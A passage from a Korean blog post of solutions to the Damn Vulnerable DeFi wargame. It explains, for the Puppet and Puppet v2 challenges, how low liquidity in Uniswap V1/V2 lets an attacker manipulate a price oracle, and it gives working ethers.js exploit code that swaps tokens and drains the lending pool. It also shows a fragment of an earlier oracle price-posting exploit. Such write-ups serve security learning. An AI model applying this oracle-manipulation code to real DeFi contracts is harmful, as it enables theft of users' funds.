+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;999&#34;</span>));
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;999&#34;</span>));
+</code></pre></div><hr>
+<h2 id="-8-puppet"># 8. Puppet<a hidden class="anchor" aria-hidden="true" href="#-8-puppet">#</a></h2>
+<h3 id="summary-7">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-7">#</a></h3>
+<p>100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.</p>
+<p>Uniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.</p>
+<p>100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.</p>
+<ul>
+<li>정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다.</li>
+<li>초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.</li>
+</ul>
+<p>공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)</p>
+<blockquote>
+<p>CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)</p>
+</blockquote>
+<h3 id="exploit-7">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-7">#</a></h3>
+<p><strong>puppet.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapExchange</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;990&#34;</span>));
+
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapExchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">tokenToEthTransferInput</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;990&#34;</span>), <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>), (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBlock</span>(<span style="color:#e6db74">&#39;latest&#39;</span>)).<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">priceOracle</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">BigNumber</span>.<span style="color:#a6e22e">from</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">calculateDepositRequired</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>)));
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfEths</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priceOracle</span>.<span style="color:#a6e22e">mul</span>(<span style="color:#ae81ff">100000</span>).<span style="color:#a6e22e">add</span>(<span style="color:#ae81ff">1</span>);
+
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">borrow</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;100000&#34;</span>), {<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">numOfEths</span>});
+</code></pre></div><hr>
+<h2 id="-9-puppet-v2"># 9. Puppet v2<a hidden class="anchor" aria-hidden="true" href="#-9-puppet-v2">#</a></h2>
+<h3 id="summary-8">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-8">#</a></h3>
+<p>Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.</p>
+<h3 id="exploit-8">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-8">#</a></h3>
+<p><strong>puppet-v2.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Swap DTV -&gt; ETH
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stamp</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBlock</span>(<span style="color:#e6db74">&#39;latest&#39;</span>)).<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapRouter</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9999&#34;</span>));
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapRouter</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">swapExactTokensForETH</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9999&#34;</span>), <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>), [<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">address</span>], <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">stamp</span>);
+
+<span style="color:#75715e">// lending!
+</span><span style="color:#75715e">// attacker eth -&gt; weth convert
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">priceOracle</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">BigNumber</span>.<span style="color:#a6e22e">from</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">calculateDepositOfWETHRequired</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>)));
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfWeths</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priceOracle</span>.<span style="color:#a6e22e">mul</span>(<span style="color:#ae81ff">1000001</span>)
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">deposit</span>({<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">numOfWeths</span>});
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">numOfWeths</span>);
+
+<span style="color:#75715e">// steal!
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">borrow</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1000000&#34;</span>));
+</code></pre></div><hr>
+<h2 id="-10-free-rider"># 10. Free rider<a hidden class="anchor" aria-hidden="true" href="#-10-free-rider">#</a></h2>
+<p><strong>TBU</strong></p>
+<hr>
+<h2 id="-11-backdoor"># 11. Backdoor<a hidden class="anchor" aria-hidden="true" href="#-11-backdoor">#</a></h2>
+<p><strong>TBU</strong></p>
+<hr>
+<h2 id="-12-climber"># 12. Climber<a hidden class="anchor" aria-hidden="true" href="#-12-climber">#</a></h2>
+<p><strong>TBU</strong></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://inhack.github.io/tags/solidity/">solidity</a></li>
+      <li><a href="https://inhack.github.io/tags/smart-contract/">smart contract</a></li>
+      <li><a href="https://inhack.github.io/tags/security/">security</a></li>
+      <li><a href="https://inhack.github.io/tags/defi/">DeFi</a></li>
+      <li><a href="https://inhack.github.io/tags/wargame/">wargame</a></li>
+      <li><a href="https://inhack.github.io/tags/ctf/">CTF</a></li>
+    </ul>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on twitter"
+        href="https://twitter.com/intent/tweet/?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&amp;hashtags=solidity%2csmartcontract%2csecurity%2cDeFi%2cwargame%2cCTF">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&amp;title=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;summary=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;source=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&title=%5bSolution%5d%20Damn%20Vulnerable%20DeFi">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on whatsapp"
+        href="https://api.whatsapp.com/send?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi%20-%20https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on telegram"
+        href="https://telegram.me/share/url?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://inhack.github.io/">inhack</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
